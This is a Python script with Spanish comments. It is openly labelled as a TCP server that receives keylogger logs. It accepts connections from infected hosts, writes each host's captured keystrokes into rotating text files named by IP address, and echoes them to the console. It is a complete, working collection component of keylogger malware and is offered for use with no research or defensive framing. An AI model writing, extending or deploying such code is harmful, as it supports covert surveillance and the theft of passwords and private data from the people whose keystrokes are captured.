import socket
import threading
from pathlib import Path
from argparse import ArgumentParser
from typing import List

def to_file(host, msg, output, buffer_length, id_zfill=3):
    """
    Función que escribe el mensaje en un fichero

    :param host: IP del host que envía el mensaje
    :type host: str
    :param msg: Mensaje recibido del host remoto a escribir en el fichero
    :type msg: str
    :param output: Carpeta donde irán los resultados
    :type output: Path
    :param buffer_length: Límite de caracteres que puede caber en un fichero
    :type buffer_length: int
    :param id_zfill: Número de ceros en el nombre de los ficheros, por defecto 3
    :type id_zfill: int, optional
    """
    archivos: List[Path] = sorted(list(output.glob(f'{host}_*.txt')))
    if not archivos:
        file_id = "1".zfill(id_zfill)
        archivo = output / f'{host}_{file_id}.txt'
        with open(archivo, "a", encoding="utf-8") as f:
            f.write(msg)
    else:
        archivo = archivos[-1]
        if len(archivo.read_text(encoding="utf-8")) >= buffer_length:
            file_id = str(int(archivo.stem.split('_')[-1]) + 1)
            archivo = output / f'{host}_{file_id.zfill(id_zfill)}.txt'
        with open(archivo, "a", encoding="utf-8") as f:
            f.write(msg)



def handle_client(conexion, direccion, output, id_zfill=3, buffer_length=1000):
    """
    Función que maneja la conexión entrante

    :param conexion: Conexión entrante
    :type conexion: Any
    :param direccion: Dirección del cliente
    :type direccion: Tuple[str, int]
    :param output: Carpeta donde irán los resultados
    :type output: Path
    :param id_zfill: Número de ceros en el nombre de los ficheros, por defecto 3
    :type id_zfill: int, optional
    :param buffer_length: Límite de caracteres que puede caber en un fichero, por defecto 1000
    :type buffer_length: int, optional
    """
    host, _ = direccion
    buffer_ = 0
    while True:
        datos = conexion.recv(1024)
        if not datos:
            break

        msg = datos.decode('utf-8')
        to_file(host, msg, output, buffer_length, id_zfill)
        if buffer_ < buffer_length:
            buffer_ += 1
        else:
            buffer_ = 0
        print(f'Mensaje de {host}:', msg)

    # Cerrar la conexión entrante
    conexion.close()


def main():
    """
    Función principal
    """
    parser = ArgumentParser(description="Servidor TCP Receptor de KeyLogs")
    parser.add_argument("-ip", "--ip-address", required=True, help="Dirección IP del Servidor TCP")
    parser.add_argument("-p", "--port", help="Puerto del Servidor TCP (default 8080)", default=8080, type=int)
    parser.add_argument('-o', '--output', help="Carpeta donde irán los resultados", default="files", type=str)
    parser.add_argument('--zero-fill', help="Número de ceros en el nombre de los ficheros (default: 3)", default=3, choices=list(range(1,6)), type=int)
    parser.add_argument('--buffer-length', help="Número de carácteres dentro del buffer antes de escribir en el fichero (default: 1000)", default=1000, type=int)
    args = parser.parse_args()

    ruta = Path(__file__).parent / args.output
    if not ruta.exists():
        ruta.mkdir()

    # Lanzar el servidor TCP
    servidor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor_socket.bind((args.ip_address, args.port))
    print(f'Escuchando conexiones entrantes en el puerto: {args.port}')
    servidor_socket.listen()

    while True:
        # Aceptar conexiones entrantes
        conexion, direccion = servidor_socket.accept()
        print('Se ha establecido una conexión desde', direccion)
        # Crear un hilo para manejar la conexión entrante y que no bloquee el servidor
        hilo = threading.Thread(target=handle_client,
                                args=(conexion, direccion, ruta,
                                      args.zero_fill, args.buffer_length))
        hilo.start()


if __name__ == '__main__':
    main()
